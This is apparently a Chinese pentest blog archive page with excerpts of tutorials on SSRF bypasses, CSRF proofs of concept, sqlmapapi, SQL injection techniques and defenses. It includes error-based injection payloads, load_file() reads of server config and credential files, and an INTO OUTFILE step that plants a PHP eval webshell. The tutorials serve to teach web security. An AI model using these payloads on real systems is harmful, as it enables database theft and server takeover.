<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pentest - Reber's Blog</title>
  <meta name="keywords" content="渗透测试 漏洞挖掘 web安全 网络安全 python php linux">
  <meta name="description" content="">
  <meta name="author" content="reber">

  
  
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
  <!--<![endif]-->

  <link rel="stylesheet" href="http://wyb0.com/css/style.css">

  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
  
  <link rel="shortcut icon" href="http://wyb0.com/img/favicon.ico" type="image/x-icon" />

  
  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">

  
  <link rel="alternate" type="application/rss+xml" title="" href="http://wyb0.com/index.xml" />

  
  <link rel="stylesheet" href="http://wyb0.com/css/monokai-sublime.css" type="text/css">
  <script src="http://wyb0.com/js/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>

  <script src="http://wyb0.com/js/jquery.min.js"></script>

</head>
<body>



<div class="reber">
    
<div class="head">
    <h1 class="logo" id="logo">
        <a href="http://wyb0.com/"><img src='http://wyb0.com/img/logo.png' width='70px'></a>
    </h1>
    <ul class="nav">
        
            
                <li>
                    <a href="http://wyb0.com/"><i class='fa fa-home fa-fw'></i>Home</a>
            
                </li>
        
            
                <li>
                    <a href="http://wyb0.com/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
            
                </li>
        
            
                <li>
                    <a href="http://wyb0.com/about/"><i class='fa fa-user fa-fw'></i>About</a>
            
                </li>
        
    </ul>
</div>

    
    <div class="main">
        <div class="left">
            <h2 style="padding:0px 0px 15px 0px;">-- Pentest --</h2>
            <div class="content">
                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SSRF/">SSRF</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-30</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/ssrf">ssrf</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 什么是SSRF &nbsp;&nbsp;&nbsp;&nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。 &nbsp;&nbsp;&nbsp;&nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。 0x01 SSRF的危害 可以扫描内部网络 可以构造数据攻击内部主机 0x02 漏洞挖掘 其实只要能对外发起网络请求就有可能存在SSRF漏洞。 1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain... 0x03 漏洞验证 http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。 0x04 绕过过滤 有时漏洞利用时会遇到IP限制，可用如下方法绕过： * 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.10.0.0.1.xip.io = 10.0.0.1 foo.bar.10.0.0.1.xip.io = 10.0.0.1 * 通过js跳转 0x05 通用的SSRF实例 * weblogin配置不当，天生ssrf漏洞
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/SSRF/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/sqlmapapi%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">sqlmapapi的简单使用</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-28</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/sqlmap">sqlmap</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量 用于交互的方法 在sqlmap/lib/utils/api.py中: # 用户方法 @get(&quot;/task/new&quot;) Create new task ID. @get(&quot;/task/&lt;taskid&gt;/delete&quot;) Delete own task ID. # 管理函数 @get(&quot;/admin/&lt;taskid&gt;/list&quot;) List task pull. @get(&quot;/admin/&lt;taskid&gt;/flush&quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&quot;/option/&lt;taskid&gt;/list&quot;) List options for a certain task ID @post(&quot;/option/&lt;taskid&gt;/get&quot;) Get the value of an option (command line switch) for a certain task ID @post(&quot;/option/&lt;taskid&gt;/set&quot;) Set an option (command line switch) for a certain task ID @post(&quot;/scan/&lt;taskid&gt;/start&quot;) Launch a scan @get(&quot;/scan/&lt;taskid&gt;/stop&quot;) Kill a scan @get(&quot;/scan/&lt;taskid&gt;/status&quot;) Return status of a scan @get(&quot;/scan/&lt;taskid&gt;/data&quot;) Retrieve the data of a scan @get(&quot;/scan/&lt;taskid&gt;/log/&lt;start&gt;/&lt;end&gt;&quot;) Retrieve a subset of log messages @get(&quot;/scan/&lt;taskid&gt;/log&quot;) Retrieve the log messages @get(&quot;/download/&lt;taskid&gt;/&lt;target&gt;/&lt;filename:path&gt;&quot;) Download a certain file from the file system sqlmapapi.py参数如下 它的-s参数可以启动一个服务(返回一个Admin Id)，只要将url给它就行了： 简单使用 1.
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/sqlmapapi%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/sqlmapapi%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">sqlmapapi的简单使用</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-28</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/sqlmap">sqlmap</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量 用于交互的方法 在sqlmap/lib/utils/api.py中: # 用户方法 @get(&quot;/task/new&quot;) Create new task ID. @get(&quot;/task/&lt;taskid&gt;/delete&quot;) Delete own task ID. # 管理函数 @get(&quot;/admin/&lt;taskid&gt;/list&quot;) List task pull. @get(&quot;/admin/&lt;taskid&gt;/flush&quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&quot;/option/&lt;taskid&gt;/list&quot;) List options for a certain task ID @post(&quot;/option/&lt;taskid&gt;/get&quot;) Get the value of an option (command line switch) for a certain task ID @post(&quot;/option/&lt;taskid&gt;/set&quot;) Set an option (command line switch) for a certain task ID @post(&quot;/scan/&lt;taskid&gt;/start&quot;) Launch a scan @get(&quot;/scan/&lt;taskid&gt;/stop&quot;) Kill a scan @get(&quot;/scan/&lt;taskid&gt;/status&quot;) Return status of a scan @get(&quot;/scan/&lt;taskid&gt;/data&quot;) Retrieve the data of a scan @get(&quot;/scan/&lt;taskid&gt;/log/&lt;start&gt;/&lt;end&gt;&quot;) Retrieve a subset of log messages @get(&quot;/scan/&lt;taskid&gt;/log&quot;) Retrieve the log messages @get(&quot;/download/&lt;taskid&gt;/&lt;target&gt;/&lt;filename:path&gt;&quot;) Download a certain file from the file system sqlmapapi.py参数如下 它的-s参数可以启动一个服务(返回一个Admin Id)，只要将url给它就行了： 简单使用 1.
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/sqlmapapi%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/CSRF/">CSRF</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-28</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/csrf">csrf</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 概念 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、 删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作 0x01 利用 利用条件 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC 利用地方 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数) 0x02 GET型CSRF攻击 若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接 有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任 此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;http://www.aa.com/opt.php?id=251&amp;act=del&amp;name=A&quot; /&gt; &lt;/body&gt; &lt;/html&gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html 恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除 0x03 POST型CSRF攻击 若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;aa&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&quot; method=&quot;post&quot;&gt; 昵称：&lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;xxxxx&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;xiaoming&quot;&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; value=&quot;&quot;&gt; 确认密码：&lt;input type=&quot;password&quot; name=&quot;cpassword&quot; id=&quot;conpassword&quot;
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/CSRF/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%98%B2%E5%BE%A1/">SQL注入之防御</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-23</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 要做的事 也就是找到注入点然后修复 0x01 防御方法 使用转义函数 如：addslashes()和mysql_real_escape_string() 在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件 &lt;?php //简单过滤 $filter = array(&amp;$_GET,&amp;$_POST,&amp;$_COOKIE); foreach ($filter as $key =&gt; $value){ foreach ($value as $k =&gt; $v){ $filter[$key][$k] = mysql_real_escape_string($v); } } ?&gt; 检查数据类型 使用(int)或settype()等将数字等进行强制转换 对邮箱、日期等也进行检查 使用预编译语句绑定变量(一般为防御SQL注入的最佳方式) &lt;?php //预编译 $mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;share&quot;); $mysqli-&gt;query(&quot;set names utf8&quot;); $sql = &quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&quot;; $s = $mysqli-&gt;prepare($sql); //绑定参数 $name = &quot;Tom&quot;; $sex = &quot;M&quot;; $age = 23; $s-&gt;bind_param(&quot;sssi&quot;,$name,$sex,$age); //执行 $result = $s-&gt;execute(); var_dump($result);
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%98%B2%E5%BE%A1/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/">SQL注入之布尔型注入</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-22</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &quot;mysql_error()&quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用 0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据 0x02 注入步骤 找注入点、猜闭合字符 猜解列数、尝试得到显示位 猜数据库名 猜表名 猜列名 猜列值 找到注入点，判断闭合字符 尝试猜解列数，得到显示位 得到数据库名 最终得到第五个数据库名为security 得到表名 最终依次猜的表名为users 得到列名 同理最终得到第2列列名为username，第3列列名为password 得到列值 依次得到为admin4，同理可得其他数据 0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- __author__=&quot;reber&quot; import sys import urllib import urllib2 import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): response = urllib2.urlopen(url) html = response.read() m2 = hashlib.md5() m2.update(html)
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/">SQL注入之报错型注入</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-22</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解 0x01 利用方式 count(*)、floor()、rand()、group by不可或缺 报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制): ?id=2&rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+ ?id=2&rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+ ?id=1&rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+ 0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次 0x03 注入步骤 得到闭合字符 猜列数、尝试爆显示位 得到数据库个数和数据库名 得到表个数和表名 得到列数量和列名 得到列值 猜测闭合字符 猜测列数 尝试得到显示位 报错得到数据库个数 报错得到数据库名 报错得到表名 报错得到列名 得到列值 0x04
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/">SQL注入之联合查询</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-21</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 前提 要用联合查询进行注入则：页面必须有显示位 0x01 联合查询 union可合并两个或多个select语句的结果集， 前提是两个select必有相同列、且各列的数据类型也相同 0x02 注入步骤 找注入点且得到闭合字符 判断数据库类型 猜解列数，得到显示位 得到基本信息(如：数据库名、数据库版本、当前数据库名等) 得到数据库名 得到表名 得到列名 得到列值 1. 找到注入点得到闭合字符 2. 判断数据库类型 3. 猜解列数，得到显示位 4. 得到基本信息(数据库名、版本、数据库版本等) 5. 得到数据库 6. 得到security数据库的表名 7. 猜解列名 8. 猜解数据
    </p>

    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMySQL%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/">SQL注入之MySQL函数利用</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-20</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 load_file() 条件: 1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码 一般步骤 读/etc/init.d下的东西，这里有配置文件路径 ?id=1' union select 1,2,load_file('/etc/init.d/httpd') 得到web安装路径 ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf') 读取密码文件 ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php') 0x01 into outfile 条件： 1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号 一般方法 当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;) 其他方法 登陆phpMyAdmin use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;); 在aaa中插入一条数据&lt;?php @eval($_POST['c']);?&gt; select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; 将aaa中的数据导出到文件a.php localhost:80/a.php能访问 drop aaa; //删除建立的表 然后菜刀连接 1.
    </p>

    
    <footer>
        <a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMySQL%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/">SQL注入之判断数据库类型</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 0px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>2016-06-19</time>
            </div>

            

            <div style="padding:2px 5px 2px 0px;">
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%B3%A8%E5%85%A5">注入</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
        0x01 扫描端口 0x02 指纹信息 0x03 在URL后面直接判断 Access: and (select count(*) from MSysAccessObjects)&gt;0 返回正常说明是access and exists(select count(*) from 表) SQLserver: and (select count(*) from sysobjects) &gt;0 返回正常说明是mssql MySQL: and length(user())&gt;0 返回正常说明是MySQL 0x04 其他方法 在mssql中可以调用substring。oracle则只可调用substr
    </p>

    
</article>


                

                

    
    
    <nav class="pagination" role="pagination">
        
            <a href="http://wyb0.com/topics/pentest/page/4/"><i class="fa fa-chevron-left"></i></a>
        

        <span>&nbsp;5 / 6&nbsp;</span>
        
        
            <a href="http://wyb0.com/topics/pentest/page/6/"><i class="fa fa-chevron-right"></i></a>
        
    </nav>


            </div>
        </div>
        <div class="right">
            <div>
                <br>
                

<div style="padding-bottom:20px;">


    <h2 class="asidetitle">Categories</h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/ajax" title="ajax">ajax(3)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/git" title="git">git(6)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/javascript" title="javascript">javascript(1)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/linux" title="linux">linux(22)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/miscellanea" title="miscellanea">miscellanea(3)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/mysql" title="mysql">mysql(6)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(10)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(59)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(10)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(30)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/server" title="server">server(8)</a></li>
        
            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/windows" title="windows">windows(6)</a></li>
        
    </ul>


</div>
                

<div style="padding-bottom:20px;">


    <h2 class="asidetitle">Tags</h2>
    <div class="taglist" id="tags">
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/ajax" title="ajax">ajax</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/burpsuite" title="burpsuite">burpsuite</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/csrf" title="csrf">csrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
